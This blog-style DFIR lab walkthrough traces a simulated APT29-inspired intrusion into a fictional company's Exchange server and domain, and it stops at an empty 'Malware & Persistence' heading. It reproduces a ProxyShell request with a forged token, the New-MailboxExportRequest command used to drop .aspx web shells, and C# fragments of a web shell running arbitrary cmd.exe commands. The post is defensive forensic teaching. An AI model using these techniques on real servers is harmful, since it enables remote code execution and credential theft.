---
title: APT29 Hybrid Intrusion Simulation
date: 2025-05-12 12:00:00
categories: [DFIR]
tags: [dfir]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/Mustand.png
  lqip:
  alt: APT-Inspired Threat Hunting Walkthrough
---

## Contributors
Adversarial Emulator: [@inversecos]
Incident Responder: [@inversecos]

## Threat Actor

***APT29 / Cozy Bear / NOBELIUM / Dark Halo***

APT29 is a Russian state-sponsored threat actor known for sophisticated intrusions targeting government, diplomatic, and enterprise networks. Their operations frequently involve hybrid intrusion techniques that bridge on-prem Active Directory environments with cloud identity providers, enabling stealthy persistence and privileged access.

## Lab Description

This lab focuses on detecting and investigating a hybrid on-prem to cloud lateral movement campaign inspired by APT29 tradecraft. The exercise replicates several of their signature TTPs to challenge detection, hunting, and forensic response capabilities:

- Golden SAML attack
- N-day exploitation attempt
- Entra ID backdoors
- OAuth abuse
- Golden Ticket
- Registry timestomping
- SDELETE recovery

This scenario is designed to simulate a full intrusion lifecycle and provide an opportunity to practice detection, response, and threat hunting using both endpoint and cloud telemetry.

## Scoping Note

**Organization**: Assassin Kitty Corp
**Industry**: Military Robotics
**Founded**: 2019
**Founder**: Dr. MenaceClawz

Assassin Kitty Corp specializes in developing advanced military robotics, most notably cat-like robotic assassins designed for tactical deployment.

### Incident Trigger

On April 8th, 2023, the organization’s CISO received an urgent notification from US-CERT reporting malicious interaction between the corporate network and a known APT29 command-and-control IP address: `4.198.67.125`. This IP is associated with nation-state intrusion campaigns and immediately elevated the situation to a high-severity security incident.

### Key Investigation Questions

The scope of the investigation was defined by three primary questions:

1. Was sensitive intellectual property accessed or exfiltrated?
2. Was the compromise successful and to what extent?
3. What actions did the threat actor perform within the network?

### Actions Taken Prior to IR Engagement

The internal security team at Assassin Kitty Corp took immediate containment and remediation measures prior to the forensic investigation:

- **New Hire Noted**: A new employee, `Sombra`, was onboarded during the same period and is considered a person of interest for insider risk analysis.
- **Firewall Blocking**: The reported malicious IP `4.198.67.125` was proactively blocked at the perimeter firewall.
- **Endpoint Scans**: Microsoft Defender scans were executed across all corporate hosts to remove any potentially resident malware.
- **Evidence Collection**: A forensic image of the compromised network segment was captured, including IP mappings for key systems, to serve as the primary source for investigation.

## Network Diagram

The image below represents the compromised segment of the Assassin Kitty Corp network that is in scope for this investigation. It highlights the systems of interest, their IP addresses, and interconnections that were potentially leveraged during the intrusion.

<img src="/assets/img/lab6.png" alt="" />


## N-Day Exploitation

The investigation started by looking into traffic related to the malicious IP `4.198.67.125` to figure out which data sources had detected it and when it was first seen.

Since multiple log sources are ingested into ELK, searches across the dataset quickly revealed this IP in both Proxy Server logs and IIS logs. These hits established the earliest point of contact and served as the starting point for reconstructing the attack timeline.

Reviewing the proxy logs revealed multiple POST and GET requests hitting the /autodiscover/autodiscover.json endpoint. This kind of activity is unusual and typically signals either autodiscover misuse or an exploitation attempt targeting Exchange.

<img src="/assets/img/as5.png" alt="" />

Looking at the proxy logs for `4.198.67.125` turned up a huge number of hits over 36,000 requests in total. A closer look showed repeated GET requests to the `/autodiscover/autodiscover.json` endpoint with query strings like `a=nfhnk@winjh.rsu/mapi/nspi`.

This pattern is a strong indicator of automated exploitation. The combination of an unusual domain (winjh.rsu), repeated autodiscover requests, and the high volume of traffic makes it clear this wasn’t normal user activity but a scripted attempt to exploit Exchange.

Digging deeper into the POST requests uncovered some interesting details. The User-Agent stood out right away — `python-urllib3/1.26.5` which is a big red flag since it’s commonly used by scripts and exploitation frameworks, not legitimate Exchange clients.

<img src="/assets/img/as6.png" alt="" />

What really caught my attention, though, was the value of the `query_string` field. It contained the `X-Rps-CAT` parameter with a long Base64 string, which is a known indicator of ProxyShell exploitation. Seeing that parameter immediately suggested this wasn’t random traffic but an actual attempt to exploit the Exchange PowerShell endpoint.

Based on prior knowledge, this activity matches the well-known ProxyShell attack chain from 2021, which chains three critical Exchange Server vulnerabilities. The first stage here is the SSRF vulnerability (CVE-2021-34473) being exploited through the autodiscover endpoint. The next step is to check if the attacker escalated privileges by abusing Exchange PowerShell Remoting which would indicate exploitation of CVE-2021-34523.

The value of the `X-Rps-CAT` parameter turned out to be Base64-encoded. After decoding it with CyberChef, the output revealed the identity being impersonated to run Exchange PowerShell commands. This step confirmed that the attacker had successfully forged a valid token and was operating under a legitimate account context a clear sign that the ProxyShell exploitation chain had progressed past initial access and into privilege escalation.

```bash
a=nfhnk@winjh.rsu/powershell/?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTB9BZG1pbmlzdHJhdG9yQGFzc2Fzc2lua2l0dHkuY29tVSxTLTEtNS0yMS0zMDU3NzI2NjgzLTM3NjU3NDY3Ny0yNDMwNDczODU1LTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==&PSVersion=5.1.17763.1971
```

<img src="/assets/img/as7.png" alt="" />

As seen earlier, the request contained an illegitimate TLD and a suspicious `X-Rps-CAT` parameter. This Base64-encoded value is serialized data created using NetDataContractSerializer, and it is often a sign of user impersonation during ProxyShell exploitation.

```bash
VTWindowsCAKerberosLAdministrator@assassinkitty.comU,S-1-5-21-3057726683-376574677-2430473855-500GS-1-5-32-544E
```

To confirm this, the Windows Event Logs were reviewed for follow-on requests around the same timeframe. One of the events contained an `X-CommonAccessToken` header. After Base64 decoding, the following token was revealed:

```yml
Client: MAIL01/15.02.0858.004  
Task: Mailbox logon verification  
API: EMSMDB.Connect()  

Task Details:
  - TaskStarted:  2023-04-02 14:13:51  
  - TaskFinished: 2023-04-02 14:13:51  

Exception:
  Microsoft.Exchange.MapiHttp.HttpServiceUnavailableException:
  Server returned HttpStatusCode.ServiceUnavailable failure.
  [HttpStatusCode=503 Service Unavailable] [LID=47372]

Request:
  [2023-04-02T04:13:51.7629499Z]
  POST /mapi/emsmdb/?useMailboxOfAuthenticatedUser=true HTTP/1.1
  Content-Type: application/octet-stream
  User-Agent: MapiHttpClient
  X-RequestId: 987fe918-3a50-45eb-9ed8-422805557fd9:1
  X-ClientInfo: 7c8c846c-5b6a-481b-91f4-411db4f4653f:1
  client-request-id: e53a1e01-afdd-4d8d-b831-c7fc948a3458
  X-ClientApplication: MapiHttpClient/15.2.858.2
  X-RequestType: Connect
  X-CommonAccessToken: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTCJBU1NBU1NJTktJVFRZXEhlYWx0aE1haWxib3g1NWJmNDUwVS1TLTEtNS0yMS0zMDU3NzI2NjgzLTM3NjU3NDY3Ny0yNDMwNDczODU1LTExNDFHBwAAAAcAAAAsUy0xLTUtMjEtMzA1NzcyNjY4My0zNzY1NzQ2NzctMjQzMDQ3Mzg1NS01MTMHAAAAB1MtMS0xLTAHAAAAB1MtMS01LTIHAAAACFMtMS01LTExBwAAAAhTLTEtNS0xNQcAAMARUy0xLTUtNS0wLTIyMDEzMzgHAAAACFMtMS0xOC0yRQAAAAA=
  X-RpcHttpProxyServerTarget: b873bdf4-03cf-4284-9caf-a12440e859e7@assassinkitty.com
  X-FeToBeTimeout: 70
  Authorization: Negotiate [truncated]
  Host: mail01.assassinkitty.com:444
  Content-Length: 0

Response:
  HTTP/1.1 503 Service Unavailable
  Connection: close
  Content-Length: 326
  Content-Type: text/html; charset=us-ascii
  Date: Sun, 02 Apr 2023 04:13:51 GMT
  Server: Microsoft-HTTPAPI/2.0

Response Body:
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
  "http://www.w3.org/TR/html4/strict.dtd">
  <HTML><HEAD><TITLE>Service Unavailable</TITLE>
  <META HTTP-EQUIV="Content-Type"
        Content="text/html; charset=us-ascii"></HEAD>
  <BODY>
    <h2>Service Unavailable</h2>
    <hr>
    <p>HTTP Error 503. The service is unavailable.</p>
  </BODY></HTML>
```

```bash
VTWindowsCAKerberosL"ASSASSINKITTY\HealthMailbox55bf450,U-S-1-5-21-3057726683-376574677-2430473855-1141G,S-1-5-21-3057726683-376574677-2430473855-513,S-1-1-0,S-1-5-2,S-1-5-11,S-1-5-15,S-1-5-5-0-2201338,S-1-18-2E
```

This confirms that `ASSASSINKITTY\HealthMailbox55bf450` was the account being impersonated. Identifying this account is critical because `HealthMailbox` accounts are commonly targeted during ProxyShell attacks they have predictable names and sufficient privileges to allow remote PowerShell access, making them an ideal foothold for privilege escalation.

After reviewing Event ID 1 entries in the MSExchange Management logs (located under `C:\Windows\System32\winevt\logs`), it was possible to reconstruct the PowerShell activity that occurred during the intrusion. These logs capture every cmdlet invocation within the Exchange Management Shell, including parameters and target mailboxes.

Several cmdlets stood out as being executed in a sequence that aligns closely with known ProxyShell post-exploitation behavior:

<img src="/assets/img/as9.png" alt="" />

This sequence is significant for two reasons:

- **Privilege Escalation:** The attacker first assigned the “Mailbox Import Export” role to the compromised account, granting it the ability to export mailbox data — a step typically needed in Exchange exploitation scenarios.

- **Data Access & Cleanup:** The attacker first created multiple `New-MailboxExportRequest` jobs to export mailbox data and then used `Remove-MailboxExportRequest` to delete those export job records from Exchange, effectively erasing evidence of which mailboxes were exported. Additionally, Search-Mailbox was executed with `-DeleteContent` to locate and permanently delete specific messages, showing clear intent to both access data and cover tracks.

This activity strongly suggests that the attacker was not just enumerating but actively exfiltrating or staging sensitive mailbox data and attempting to cover their tracks.

Pulling these three cmdlets together — `New-ManagementRoleAssignment`, `New-MailboxExportRequest`, and `Remove-MailboxExportRequest` — paints a pretty clear picture of what the attacker was up to.

At `04:30:22 on April 2, 2023`, the attacker first gave `henry@assassinkitty.com` elevated permissions by running:

<img src="/assets/img/as8.png" alt="" />

This role isn’t something a normal user has by default — it’s needed to export mailbox data. Right after that, the attacker started firing off `New-MailboxExportRequest` commands to dump mailbox contents.

Right after the attacker gave `henry@assassinkitty.com` the Mailbox Import Export role, they wasted no time using it. At `04:30:30 on April 2, 2023`, a `New-MailboxExportRequest` cmdlet was executed to export the `Drafts` folder from Henry’s mailbox.

<img src="/assets/img/as10.png" alt="" />

```powershell
New-MailboxExportRequest `
  -Name "xnUgSIER" `
  -Mailbox "henry@assassinkitty.com" `
  -IncludeFolders ("#Drafts#") `
  -ContentFilter "(Subject -eq '2Ffy1lv4n')" `
  -ExcludeDumpster "True" `
  -FilePath "\\mail01.assassinkitty.com\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\tWpQap3.aspx"
```

This is especially interesting because the ContentFilter was looking for a subject line that matched `2Ffy1lv4n`, and the exported data was written directly to the `owa\auth` directory as an `.aspx` file. That directory is commonly abused by attackers to drop webshells.

Just under 30 seconds later, at 04:30:58, the attacker executed:

<img src="/assets/img/as11.png" alt="" />

```powershell
Remove-MailboxExportRequest -Identity "henry@assassinkitty.com\xnUgSIER" -Confirm:$true
```

This command removed the export request object from Exchange, wiping the record of that job from the management logs. While the exported `.aspx` file still existed on disk, the control plane record was gone — a deliberate anti-forensics move to make it harder for defenders to trace what was exported.

Looking at the overall sequence of activity, the same three cmdlets were run over and over — always in the same order. First, the attacker assigned the “Mailbox Import Export” role to henry@assassinkitty.com, giving the account the ability to perform mailbox exports. Immediately after, they used New-MailboxExportRequest to create an export job that wrote a .aspx file into the Exchange owa\auth directory (effectively dropping a web shell). Finally, they executed Remove-MailboxExportRequest to delete the export job record and cover their tracks.

## Webshell

Analysis of the `New-MailboxExportRequest` logs revealed that the attacker didn’t just drop one web shell — they deployed nine separate ASPX web shells into the Exchange `owa\auth` directory.

Some of the web shells identified include:

```bash
pziBKFxG.aspx
VsebSfth8lb.aspx
VEITvpaOp.aspx
vDha0J3pz.aspx
kzNpYqWUGR.aspx
KGxvN2x5bd6.aspx
PAZvnLKDE.aspx
MhP1SViyQWF.aspx
UIdTkuy5P.aspx
```

### Weaponizing **New-MailboxExportRequest**

One of the most interesting parts of this attack is how the attacker turned a normal Exchange admin cmdlet into a way to drop web shells.

This Exchange management command is normally used by administrators to export mailbox contents to a PST file for compliance or backup purposes. In this case, the attacker weaponized the process to drop web shells directly into the Exchange web-accessible directories.

Here’s how they used it:

1. **Prepare the Payload:** They created or sent emails that had Base64-encoded ASPX web shells as attachments.

2. **Export to a Web-Accessible Path:** Using New-MailboxExportRequest, they told Exchange to export the mailbox (or just the Drafts folder) straight to the owa\auth directory on MAIL01, but with a .aspx file extension instead of .pst.

3. **Automatic Decode:** When Exchange does the export, it automatically decodes attachments before writing them. So the Base64 payload inside the email was turned into a real ASPX file on disk.

4. **Result:** The attacker ended up with a fully functional web shell dropped into a folder IIS serves over the web, giving them remote code execution.

This is a very stealthy technique because it uses legitimate Exchange functionality and doesn’t involve dropping a suspicious binary manually — everything looks like standard mailbox export activity until you look closely at the file path and extension.

<a href="https://imgflip.com/i/a5zm4w"><img src="https://i.imgflip.com/a5zm4w.jpg" title="made at imgflip.com"/></a>

Searching the IIS logs for `20.248.160.67` revealed multiple events of interest. The IP shows up in the cs_referer field and is linked to client IP `49.186.216.46`, which had been active earlier in the attack chain.

<img src="/assets/img/as19.png" alt="" />

One of the most important findings was a GET request to:

```bash
https://20.248.160.67/owa/auth/kzNpYqWUGR.aspx
```

This is one of the ASPX web shells dropped in the earlier phase using `New-MailboxExportRequest`. The request returned a 200 OK status, confirming that the web shell was successfully written to disk and could be executed remotely. This is clear evidence that the attacker had achieved remote code execution on the Exchange server.

When checking the `owa\auth` directory after the web shell activity, it was clear that the attacker had started cleaning up their tracks. The previously dropped web shell `kzNpYqWU6R.aspx`, which we saw executed in the IIS logs, was no longer present.

Out of the nine web shells dropped earlier, only three remained in the folder:

<img src="/assets/img/as12.png" alt="" />

To figure out what happened to the missing web shell `kzNpYqWU6R.aspx`, the `$MFT` of the MAIL server was parsed to track its movement. The results showed that the file wasn’t deleted completely — it had been moved to a new location:

<img src="/assets/img/as13.png" alt="" />

After confirming from `$MFT` parsing that `kzNpYqWU6R.aspx` had been moved to a new directory, a review of that location showed that it wasn’t the only file there.

Inside `C:\inetpub\wwwroot\aspnet_client\system_web\4_0_30319`, a total of four web shells were found:

<img src="/assets/img/as14.png" alt="" />

Before moving further, I wanted to confirm what kind of file this actually was. Normally, I would use the file utility on a forensic workstation to check the file type, but here I opened the `kzNpYqWU6R.aspx` file in `CyberChef` and grabbed the first four bytes.

The first bytes were:

<img src="/assets/img/as15.png" alt="" />

```bash
21 42 4E 4E
```
Looking this up on [File Signature](https://sceweb.sce.uhcl.edu/abeysekera/itec3831/labs/FILE%20SIGNATURES%20TABLE.pdf) showed that the file signature matches an Outlook-related file type (PST/OST).

This confirmed that what we are looking at is not a typical web shell dropped as plain text, but rather a mailbox export output — exactly what would be created by the `New-MailboxExportRequest` cmdlet. This makes sense given the attacker’s technique: Exchange wrote the mailbox data directly to disk, with the .aspx extension making IIS treat it as an executable page.

To better understand what was inside the exported file, the `.aspx` file was renamed to `.ost` and opened with `XST Reader`. This allowed the mailbox contents to be browsed just like a normal offline mailbox.

<img src="/assets/img/as16.png" alt="" />

Inside the Drafts folder, a single email with the subject FC9FTvJGy was found. The email contained an attachment named `cupiditate-deserunt.docx`. This matches the attacker’s technique of planting pre-crafted emails with encoded attachments inside the target mailbox before running `New-MailboxExportRequest`.

This confirms that the mailbox export request wasn’t random — it was deliberately pulling out a message with a malicious attachment that would later be written to disk, decoded, and weaponized as part of the attacker’s web shell deployment.

While digging deeper into the IIS logs, another suspicious file was discovered: download.aspx in the `owa\auth` directory.

The logs show multiple `POST` requests to this file, all with `200` OK responses, which confirms successful execution:

<img src="/assets/img/as17.png" alt="" />

The query parameter (`fdir=C:\Windows\Temp\Tools`) makes it look like the attacker was either browsing or retrieving files from that directory. This strongly suggests that `download.aspx` was not a legitimate Exchange file but a custom web shell attacker deployed.

### **download.aspx** Web Shell

Reviewing the contents of download.aspx confirmed it to be a classic ASPX Shell. Below is a breakdown of its main functionality:

```csharp
string dir = Page.MapPath(".") + "/";
if (Request.QueryString["fdir"] != null)
    dir = Request.QueryString["fdir"] + "/";
dir = dir.Replace("\\", "/").Replace("//", "/");
```

**Purpose:** Determines the current working directory. Allows attackers to pivot into any folder by supplying `?fdir=<path>` in the URL.

```csharp
if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
{
    Response.ClearContent();
    Response.WriteFile(Request.QueryString["get"]);
    Response.End();
}
```
**Purpose:** Sends the requested file back to the browser. This is how files in `C:\Windows\Temp\Tools` were likely staged for exfiltration.

```csharp
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardError = true;
p.Start();
lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
```
**Purpose:** Executes arbitrary commands on the host using `cmd.exe`. Outputs are displayed back to the attacker in the browser. This is the most dangerous part — full code execution under the IIS worker process.

`download.aspx` is a multi-functional backdoor that supports browsing, downloading, uploading, deleting, and executing code — essentially a file manager and remote shell in one. The logs showing `POST` requests with `fdir=` parameters and 200 responses line up perfectly with this functionality.

A review of `C:\Windows\Temp\Tools` uncovered several binaries and scripts that shed light on the attacker’s objectives and post-exploitation behavior. These tools appear to have been staged for system manipulation and cleanup:

<img src="/assets/img/as18.png" alt="" />

The presence of these tools lines up with what was observed in the IIS logs (`download.aspx` activity) and demonstrates that the attacker was preparing for defense evasion, lateral movement, and cleanup after their operations.

## Credential Dumping

Further review of the IIS logs shows that the download.aspx web shell was not limited to interacting with files in `C:\Windows\Temp\Tools`. Multiple GET requests were also observed targeting the broader `C:\Windows\Temp` directory.

<img src="/assets/img/as20.png" alt="" />

While exploring the `C:\Windows\Temp` directory, two key files stood out:

<img src="/assets/img/as21.png" alt="" />

The combination of these two artifacts is a classic sign of post-exploitation credential access activity. The presence of `lsass.dmp` confirms that credential material was extracted from memory, and the attacker could have used these credentials for further lateral movement within the network.

When correlating this with IIS logs, the download.aspx web shell activity targeting the Temp folder makes sense — the attacker likely used the web shell to retrieve `lsass.dmp` after dumping it, exfiltrating credentials without touching traditional network file transfer methods.

To confirm how `lsass.dmp` was created, Event ID 4688 (process creation) logs were reviewed. The logs revealed that `procdump64.exe` was launched from `C:\Windows\Temp` with PowerShell as its parent process:

<img src="/assets/img/as22.png" alt="" />

This process chain shows that the attacker used PowerShell to spawn procdump64.exe and dump LSASS memory. The resulting dump (lsass.dmp) was later found in the Temp directory, indicating credential harvesting activity.

While digging deeper into the system, another copy of the LSASS memory dump was found — this time inside the Temp folder of the user account `Henry` (`C:\Users\henry\AppData\Local\Temp\lsass.DMP`).

<img src="/assets/img/as23.png" alt="" />

During `$MFT` analysis of PC01, it was confirmed that a copy of `lsass.dmp` existed in location:

<img src="/assets/img/as24.png" alt="" />

After checking the successful logon events (Event ID 4624), it became clear that an unknown workstation — `DESKTOP-3GKPVJB` — was logging in to both MAIL01 and PC01 using the account winston. What made this more suspicious was that the workstation used different public IPs across multiple sessions.

<img src="/assets/img/as25.png" alt="" />

This behavior strongly suggests that the attacker had full control over PC01 at this stage, using Winston’s account to move laterally and maintain persistence within the network.

### NTDS.DIT Extraction via Volume Shadow Copy

When trying to extract ntds.dit (the Active Directory database), directly copying the file is not possible because it is locked by the system. A common attacker technique is to use Volume Shadow Copy to create a snapshot of the disk and then copy `ntds.dit` from that snapshot.

The logs reveal two process creation events (Event ID 4688) showing `vssadmin.exe` execution initiated by the user winston:

<img src="/assets/img/as26.png" alt="" />

This strongly indicates that the attacker used `vssadmin.exe` to create or list shadow copies, enabling offline access to `ntds.dit` and `SYSTEM` hive files. These files could then be used in tools like `ntdsutil.exe`, `secretsdump.py`, `Mimikatz` or `DSInternals` to extract NTLM password hashes, Kerberos keys, and even plaintext credentials.

Analyzing the `$MFT` of DC01 revealed that the `ntds.dit` database was successfully exported to `C:\extract`. Additionally, a copy of the file was found in `C:\Users\winston\OneDrive\extract`, suggesting that the attacker exfiltrated the Active Directory database or prepared it for syncing via OneDrive for later retrieval.

<img src="/assets/img/as27.png" alt="" />

## Malware & Persistence

